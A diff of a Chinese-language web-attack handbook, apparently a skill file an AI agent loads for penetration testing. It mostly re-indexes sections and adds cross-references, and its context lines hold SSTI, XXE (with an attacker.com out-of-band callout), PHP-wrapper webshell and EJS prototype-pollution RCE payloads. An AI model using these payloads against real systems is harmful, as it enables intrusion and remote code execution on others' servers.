@@ -8,25 +8,25 @@ metadata: { domain: web, tier: T1 }
 
 # Web 攻击综合手册
 
-> 🔴 **不自动加载。agent 需要时调用 `加载技能 web-attacks`，先读此索引定位目标章节。**
+> 🔴 **不自动加载。agent 需要时用 skill 工具按名加载 web-attacks，先读此索引定位目标章节。**
 
 ## 快速索引
 
 | 场景 | 跳转 |
 |------|------|
 | 不知道是什么 CMS/框架 | §1 技术栈识别 |
-| 找到 CMS 名字+版本 | §6 CMS/框架速查 (WordPress/Joomla/Drupal/...) |
-| 有输入框/参数 | §5 注入: SQLi→§5.1, SSTI→§5.2, XXE→§5.3, CMDi→§5.4 |
-| 有文件上传 | §4.3 文件上传绕过 |
-| 需要绕过登录 | §3 认证: JWT→§3.1, Session→§3.2, OAuth→§3.3 |
-| URL 可以用来请求外部 | §4.1 SSRF |
-| 可以读文件 (LFI/路径) | §4.2 路径穿越 + LFI→RCE |
-| 反序列化 | §5.5 反序列化 |
-| NoSQL 后端 | §5.1.3 MongoDB / §5.1.4 其它 NoSQL |
-| HTTP 走私 | §4.4 HTTP Request Smuggling |
-| WebSocket | §7 WebSocket 攻击 |
-| 有 admin bot | §8 XSS + Bot 钓鱼 |
-| 新发现的框架 (2025-2026) | §6.8 新框架速查 |
+| 找到 CMS 名字+版本 | §7 CMS/框架速查 (WordPress/Joomla/Drupal/...) |
+| 有输入框/参数 | §3 注入攻击：SQLi / SSTI / XXE / 命令注入 / 反序列化 |
+| 有文件上传 | §5 文件相关攻击 → 文件上传 |
+| 需要绕过登录 | §6 认证攻击：JWT / Session / OAuth（JWT 高级见 §10.4）|
+| URL 可以用来请求外部 | §4 SSRF |
+| 可以读文件 (LFI/路径) | §5 文件相关攻击 → LFI / 路径遍历 |
+| 反序列化 | §3 注入攻击 → 反序列化 |
+| NoSQL 后端 | §3 NoSQL → 加载 mongodb-aggregation-injection 卡 |
+| HTTP 走私 | §8 2025-2026 重点关注 → HTTP Request Smuggling |
+| WebSocket | §9.5 WebSocket 注入 |
+| 有 admin bot | §3 注入攻击 → XSS |
+| 新发现的框架 (2025-2026) | §8 2025-2026 重点关注 |
 
 ## 0. OWASP Top 10 2025 速查
 
@@ -146,6 +146,7 @@ Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
+（沙箱逃逸见 python-sandbox-escape 卡）
 
 ### 命令注入
 
@@ -162,10 +163,11 @@ Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/oob">]>  <!-- OOB -->
 ```
+（高级 XXE/XInclude/fontTools CDATA 见 xml-attacks-beyond-xxe 卡）
 
 ### 反序列化
 
-> 见 deserialization-attacks — Java/PHP/Node/Python 全链
+> 见 dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python）
 
 ---
 
@@ -193,6 +195,7 @@ php://filter/convert.base64-encode/resource=index
 php://filter/write=convert.base64-decode/resource=shell.php  (需配合 POST body 传 base64 内容)
 expect://id / data://text/plain,<?php system('id');?>
 ```
+（LFI→RCE 污染链见 log-poisoning-lfi-rce 卡）
 
 ### 文件上传
 
@@ -384,6 +387,7 @@ Content-Type: application/json
 # EJS RCE:
 {"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');//"}}
 ```
+（完整见 prototype-pollution 卡）
 
 ### 9.3 Race Condition（竞态条件）
 ```
